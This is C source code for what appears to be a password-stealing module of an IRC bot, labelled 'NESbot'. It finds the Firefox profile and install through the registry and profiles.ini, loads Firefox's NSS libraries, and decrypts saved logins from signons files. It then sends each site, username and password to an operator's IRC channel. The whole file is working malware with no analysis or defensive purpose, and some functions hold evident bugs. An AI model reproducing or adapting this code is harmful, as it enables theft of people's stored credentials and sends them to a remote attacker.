#include "../h/includes.h"
//#include "../h/externs.h"
//#include "../h/functions.h"

typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};
const int buflen = 10240;
static char readbuf[buflen+1];
static int last = 0;
static int next = 0;
typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);
void NSSUnload();
int InitFFLibs(char *firefoxPath);
int InitializeNSSLibrary(char *profilePath);
int CheckMasterPassword(char *password);
int DirectoryExists( char *path );
void StrLwr(char *str);
int OpenFile(char *filePath);
void CloseFile();
int ReadLine(char *buffer, int size);
char *GetFFProfilePath();
char *GetFFLibPath();
char *GetFFVersion();
char **Explode(char *StrIn,const char *Delimiter);
char *Split(char *String,char Delimeter[],int Part);
char *replace(char *str, const char *substr, const char *repstr);
char ReadChar();
char Vers[_MAX_PATH] = "";
int version = 1;
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen);
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
NSS_Init                NSSInit = NULL;
NSS_Shutdown            NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword  PK11CheckUserPassword = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
PL_Base64Decode         PLBase64Decode = NULL;
int IsNSSInitialized = 0;
HMODULE libnss = NULL;
HMODULE libplc = NULL;
HMODULE libtmp = NULL;
FILE *signonFile = NULL;
HMODULE LoadLibrary(char *firefoxDir, char *libName)
{
char loadPath[4096]="";

    strcpy(loadPath, firefoxDir);
    strcat(loadPath, "/");
    strcat(loadPath, libName);

    libtmp = LOADLIBRARY(loadPath);

    if( !libtmp )
    {
		return 0;
    }

    return libtmp;
}
int OpenFile(char *filePath)
{
	last = next = 0;
    signonFile = fopen(filePath, "r");

    if( signonFile == NULL )
    {
	  return 0; //fail
	}

  return 1;
}
char ReadChar()
{

  if (next >= last)
  {
    next = 0;
    last = fread(readbuf, 1, buflen, signonFile);
    if (last <= 0 )
    {
	 return 0;
    }
  }

  return (readbuf[next++]);
}
int ReadLine(char *buffer, int size)
{
  unsigned int c;
  int strLength = 0, i=0;
 
  buffer[0] = 0;

  while(1)
  {
      c = ReadChar(); 

	  // eof reached
	  if ( c == 0 ) // || feof(file) )
		  return 0;

	  if (c == '\n')
      {
          buffer[strLength++] = 0;
          break;
	  }

      if (c != '\r')
	  {
          for(i=0; i < 4 && ( (c & 0xff) != 0 ) ; i++)
          {
              if( strLength >= size )
              {
				  return 0;
			  }
              buffer[strLength++] = (char)c;
              c = c >> 8;
		  }
	  }
  }
 
  return 1;

}
int DirectoryExists( char *path )
{
    DWORD attr = GetFileAttributes(path);
	if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) )
	{
		return 0;
    }
    return 1;
}
void StrLwr(char *str)
{
int n=strlen(str);
	for(int i=0; i<n; i++)
	{
		if( str[i] >=65 && str[i]<=90 )
		str[i]+=32;
	}
}
int InitFFLibs(char *FFDir)
{
    libnss = libplc = NULL;
  if( FFDir != NULL )
  {
	if(!LoadLibrary(FFDir, MOZCRT_LIBRARY_NAME))
	{
		goto version2; 
	} else {
if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
{
	if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
	{
		if( LoadLibrary(FFDir, PLC_LIBRARY_NAME) )
		{
				 if( LoadLibrary(FFDir, NSSU_LIBRARY_NAME) )
				 {
			
					if( LoadLibrary(FFDir, SQLITE_LIBRARY_NAME) )
						{

						}
				 }
		   }
	  }
   }
}		
version2:
			
            if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
			{
                if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
				{
					if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
                    {
								if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
								{
                                    if( LoadLibrary(FFDir, SOFTN_LIBRARY_NAME) )
                                    {
                                            libnss=LoadLibrary(FFDir, NSS_LIBRARY_NAME);
                                    }
                                }

					}
				}
			}
	}
    if( !libnss )
	{
        libnss =LOADLIBRARY(NSS_LIBRARY_NAME);
		libplc =LOADLIBRARY(PLC_LIBRARY_NAME);
        if( !libnss || !libplc )
		{
			return 0;
        }
	} 
    // Extract the required functions....
    NSSInit                   = (NSS_Init) GETPROCADDRESS(libnss, "NSS_Init");
    NSSShutdown               = (NSS_Shutdown)GETPROCADDRESS(libnss, "NSS_Shutdown");
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GETPROCADDRESS(libnss, "PK11_GetInternalKeySlot");
    PK11FreeSlot           = (PK11_FreeSlot) GETPROCADDRESS(libnss, "PK11_FreeSlot");
    PK11Authenticate       = (PK11_Authenticate) GETPROCADDRESS(libnss, "PK11_Authenticate");
    PK11SDRDecrypt         = (PK11SDR_Decrypt) GETPROCADDRESS(libnss, "PK11SDR_Decrypt");
    PK11CheckUserPassword  = (PK11_CheckUserPassword ) GETPROCADDRESS(libnss, "PK11_CheckUserPassword");

    if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword)
    {
		NSSUnload();
        return 0;
    }

	// Get the functions from PLC library
	PLBase64Decode     = ( PL_Base64Decode ) GETPROCADDRESS(libplc, "PL_Base64Decode");

	if( !PLBase64Decode )
	{
		NSSUnload();
        return 0;
	} else {
	 return 1;
	}

  return 1;
}
//-----------------------------------------------------------------------
int InitializeNSSLibrary(char *profilePath)
{
	IsNSSInitialized = 0;

    // Initialize the NSS library
    if( (*NSSInit) (profilePath) != SECSuccess )
	{
		NSSUnload();
		return 0;
	} else {
	IsNSSInitialized = 1;
	}

  return 1;
}
//-----------------------------------------------------------------------
void NSSUnload()
{
    if( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

    if( libnss != NULL )
		FREELIBRARY(libnss);  //Free nss library

    if( libplc != NULL )
		FREELIBRARY(libplc);  //Free plc library
}
//-----------------------------------------------------------------------
int DecryptStr(char *cryptData, char **clearData)
{
int decodeLen = 0;
int finalLen = 0;
char *decodeData = NULL;
char *finalData = NULL;

	if( cryptData[0] != NULL )
	{
		if(  (Base64Decode(cryptData, &decodeData, &decodeLen) == 0) || (decodeData == NULL) )
        {
			return 0;
		}

		// Do the actual PK11 decryption
        if( (PK11Decrypt(decodeData, decodeLen, &finalData, &finalLen) == 0) || (finalData == NULL))
		{
			return 0;
		}

		*clearData = (char*) malloc( finalLen + 1 );
        if( *clearData == NULL )
        {
			return 0;
		}
        memcpy(*clearData, finalData, finalLen);
		*(*clearData + finalLen) = 0;    // Null terminate string

		return 1;
	}

	if(  Base64Decode(cryptData, clearData, &decodeLen) == 0 )
	{
		return 0;
	}

	return 1;
}
//-----------------------------------------------------------------------
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen)
{
    int len = strlen( cryptData );
    int adjust = 0;

    if (cryptData[len-1] == '=')
    {
      adjust++;
      if (cryptData[len-2] == '=')
		  adjust++;
    }

    *decodeData = ( char *)(*PLBase64Decode)(cryptData, len, NULL);

	if( *decodeData == NULL )
	{
		return 0;
    }
   
    *decodeLen = (len*3)/4 - adjust;

    return 1;
}
//-----------------------------------------------------------------------
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen)
{
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot)
    {
		return 0;
	}

	// Decrypt the string
    request.data = (unsigned char *)decodeData;
    request.len = decodeLen;
    reply.data = 0;
	reply.len = 0;

    status = (*PK11SDRDecrypt)(&request, &reply, NULL);

    if (status != SECSuccess)
	{
		return 0;
	}

    *clearData = (char*)reply.data;
    *finalLen  = reply.len;

	// Free the slot
	(*PK11FreeSlot)(slot);
	return 1;
}
char *profilePath2;
char *signonFile2;
//-----------------------------------------------------------------------
BOOL DumpPW(void* conn)
{
	IRC* irc=(IRC*)conn;
	char buffer[10240];
char sbuffer[10240];
char name[10240];
char final[10000];
char szPass[1240];
char szUrl[1240];
char msgbuf[1240];
char host[MAX_PATH];
char szLogin[1240];
char *clearData = NULL;
BOOL IsLogin;
int bufferLength = 10240;
int count = 0;
int ret;
	if( profilePath2 == NULL || signonFile2 == NULL)
	{
		return 0;
	}
	strcpy(sbuffer,profilePath2);
	strcat(sbuffer,"\\");
	strcat(sbuffer,signonFile2);
	if(OpenFile(sbuffer) == 0 )
	 {
		 return 0;
	 } else {
	ReadLine(buffer, bufferLength);
	while (ReadLine(buffer, bufferLength) != 0)
	{
		if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
			break;
	}
while (ReadLine(buffer, bufferLength) != 0 ){
 sprintf(szUrl, "%s", buffer);
 while (ReadLine(buffer, bufferLength) != 0 )
 {

	if (buffer[0] == '.')
	{
	break; 
	}
	if (buffer[0] == '*')
	{
		strcpy(name,&buffer[1]);
		ret = ReadLine(buffer, bufferLength);
		IsLogin = FALSE;
	} else {
		strcpy(name, buffer);
		ret = ReadLine(buffer, bufferLength);
		IsLogin = TRUE;
	}
	if( DecryptStr(buffer, &clearData) == 1 )
	{
		if (IsLogin)
		{;
		sprintf(szLogin, "%s", clearData);
		}
		else 
		{
		sprintf(szPass, "%s", clearData);
		}
		}
	 }
	sprintf(final, "[\2NES\2bot] \2»\2› [Pstore-FF] %s %s:%s\n", szUrl, szLogin, szPass);
	irc->pmsg(InfoChan, final);
	}
  return 1;
}
}
char *GetFFLibPath()
{
	char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
	char path[_MAX_PATH] ="";
	char *FFDir = NULL;
	DWORD pathSize = _MAX_PATH;
	DWORD valueType;
	HKEY rkey;
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
	{
		return NULL;
    }
	if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS )
	{
        RegCloseKey(rkey);
        return NULL;
    }

    if( pathSize <= 0 || path[0] == 0)
	{
		RegCloseKey(rkey);
		return NULL;
	}

	RegCloseKey(rkey);
	if( path[0] == '\"' )
	{
		for(int i=0; i < strlen(path)-1 ; i++)
            path[i] = path[i+1];
	}
	for(int j=strlen(path)-1; j>0; j--)
	{
        if( path[j] == '\\' )
		{
			path[j]=0;
			break;
        }
	}
	FFDir = (char*) malloc( strlen(path) + 1);

		if(FFDir)
			strcpy(FFDir, path);

 return FFDir;
}
char *GetFFProfilePath()
{
char profilePath[_MAX_PATH] = "";
char partialPath[] = "Application Data\\Mozilla\\Firefox";
char profileFile[_MAX_PATH];
char line[1024];

DWORD pathSize = _MAX_PATH;
char *finalProfilePath = NULL;
int  isDefaultFound = 0;
HANDLE token;
    if( OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE )
    {
		return NULL;
    }
   
    if( fGetUserProfileDirectory(token, profilePath, &pathSize) == FALSE )
	{
        return NULL;
    }
    strcpy(profileFile, profilePath);
    strcat(profileFile,"\\");
    strcat(profileFile,partialPath);
	strcat(profileFile,"\\profiles.ini");
    FILE *profile = fopen(profileFile, "r");
   
	if( profile == NULL )
    {
        return NULL;
    }
	while(fgets(line, 1024, profile))
	{
		StrLwr(line);

        if( !isDefaultFound && ( strstr(line, "name=default") != NULL) )
		{
            isDefaultFound = 1;
            continue;
		}
		if( isDefaultFound )
		{
			if( strstr(line,"path=") != NULL)
			{
				char *slash = strstr(line,"/");
               
                if( slash != NULL )
                    *slash = '\\';
                line[strlen(line)-1] = 0;

                char *start = strstr(line,"=");
           
				int totalLen = strlen(profilePath) + strlen(partialPath) + strlen(start) + 3 ;
				finalProfilePath = (char *) malloc(totalLen);

                if( finalProfilePath )
                {
					strcpy(finalProfilePath,profilePath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,partialPath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,start+1);
                }

				break;
			}
        }
   
    }

	fclose(profile);
    
  return finalProfilePath;
}
char *GetFFVersion()
{
char regSubKey[] = "SOFTWARE\\Mozilla\\Mozilla Firefox";
char *FFVers = NULL;
DWORD pathSize = _MAX_PATH;
DWORD valueType;
HKEY rkey;
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
		return NULL;
	}
    if( RegQueryValueEx(rkey, "CurrentVersion", 0,  &valueType, (unsigned char*)&Vers, &pathSize) != ERROR_SUCCESS )
	{
        RegCloseKey(rkey);
		return NULL;
    }

		if( pathSize <= 0 || Vers[0] == 0)
    {
		RegCloseKey(rkey);
        return NULL;
    }   

		RegCloseKey(rkey);
	
		FFVers = (char*) malloc( strlen(Vers) + 1);
   
    if( FFVers )
	strcpy(Vers,FFVers);
	if (FFVers[1] == '1')
	{
		version = 1;
	}else{
	if (FFVers[1] == '2')
	{
		version = 2;
	}else{
	if (FFVers[1] == '3')
		{
		version = 3;	
		}
	}
	} 
	return (FFVers);
}
DWORD WINAPI FireFox (LPVOID param)
{
	DWORD id;
	NTHREAD firefox = *((NTHREAD *)param);
	NTHREAD *firefoxs = (NTHREAD *)param;
	firefoxs->gotinfo = TRUE;
	IRC* irc=(IRC*)firefox.conn;
	char *ProfilePath = NULL; 
	char *FFDir = NULL;
	ProfilePath = GetFFProfilePath();

	if( !DirectoryExists(ProfilePath))
	{
	  return 0;
	}
	
	FFDir = GetFFLibPath();

	if( !DirectoryExists(ProfilePath))
	{
	  return 0;
	}
		if( InitFFLibs(FFDir) )
		{
			if( InitializeNSSLibrary(ProfilePath) )
			{
				profilePath2 = ProfilePath;
				signonFile2 = "signons1.txt";
				DumpPW(firefox.conn);
				signonFile2 = "signons2.txt";
				DumpPW(firefox.conn);
				signonFile2 = "signons3.txt";
				DumpPW(firefox.conn);
				NSSUnload();
			}
		}

	while(1){
	Sleep(10000);
	}

}
